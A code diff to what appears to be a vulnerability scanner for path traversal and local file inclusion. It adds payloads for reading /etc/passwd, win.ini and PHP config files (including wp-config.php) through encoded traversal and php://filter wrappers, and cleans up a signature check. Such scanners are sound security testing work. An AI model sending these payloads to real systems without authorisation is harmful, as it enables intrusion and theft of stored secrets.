@@ -25,17 +25,30 @@ _PASSWD_RE = re.compile(r"root:.*?:0:0:", re.IGNORECASE)
 _WININI_RE = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)
 _B64_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")
 
-# (payload, signature_kind)
+# (payload, signature_kind). Confirmation is by file-CONTENT signature, so broadening the payload set
+# only widens filter/encoding coverage — it never adds false positives.
 _PAYLOADS: list[tuple[str, str]] = [
-    ("../../../../../../../../etc/passwd",            "passwd"),
-    ("....//....//....//....//....//etc/passwd",       "passwd"),
-    ("..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",       "passwd"),
-    ("/etc/passwd",                                    "passwd"),
-    ("../../../../../../../../etc/passwd%00",           "passwd"),
-    ("..\\..\\..\\..\\..\\..\\windows\\win.ini",        "winini"),
-    ("../../../../../../../../windows/win.ini",          "winini"),
-    ("php://filter/convert.base64-encode/resource=index.php",   "phpfilter"),
-    ("php://filter/convert.base64-encode/resource=index",       "phpfilter"),
+    # ── Unix /etc/passwd: plain, nested-traversal, single/double URL-encoding, null-byte, absolute ──
+    ("../../../../../../../../etc/passwd",                         "passwd"),
+    ("....//....//....//....//....//etc/passwd",                    "passwd"),
+    ("....\\/....\\/....\\/....\\/etc/passwd",                      "passwd"),
+    ("..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",                    "passwd"),
+    ("%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", "passwd"),
+    ("/etc/passwd",                                                "passwd"),
+    ("../../../../../../../../etc/passwd%00",                       "passwd"),
+    # ── Windows win.ini: relative, deep forward-slash, URL-encoded backslashes, absolute paths ──
+    ("..\\..\\..\\..\\..\\..\\windows\\win.ini",                    "winini"),
+    ("../../../../../../../../windows/win.ini",                      "winini"),
+    ("..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",            "winini"),
+    ("C:\\windows\\win.ini",                                       "winini"),
+    ("C:/windows/win.ini",                                         "winini"),
+    # ── PHP stream wrappers: base64 source disclosure (index + common config/secret files) ──
+    ("php://filter/convert.base64-encode/resource=index.php",       "phpfilter"),
+    ("php://filter/convert.base64-encode/resource=index",           "phpfilter"),
+    ("php://filter/read=convert.base64-encode/resource=index.php",  "phpfilter"),
+    ("php://filter/convert.base64-encode/resource=config.php",      "phpfilter"),
+    ("php://filter/convert.base64-encode/resource=../config.php",   "phpfilter"),
+    ("php://filter/convert.base64-encode/resource=wp-config.php",   "phpfilter"),
 ]
 
 
@@ -55,7 +68,7 @@ def _confirm(text: str, kind: str) -> str | None:
         return m.group(0)
     if kind == "winini" and _WININI_RE.search(text):
         return "win.ini contents"
-    if kind in ("phpfilter", "phpfilter") and _b64_has_php(text):
+    if kind == "phpfilter" and _b64_has_php(text):
         return "base64-encoded PHP source"
     return None
 
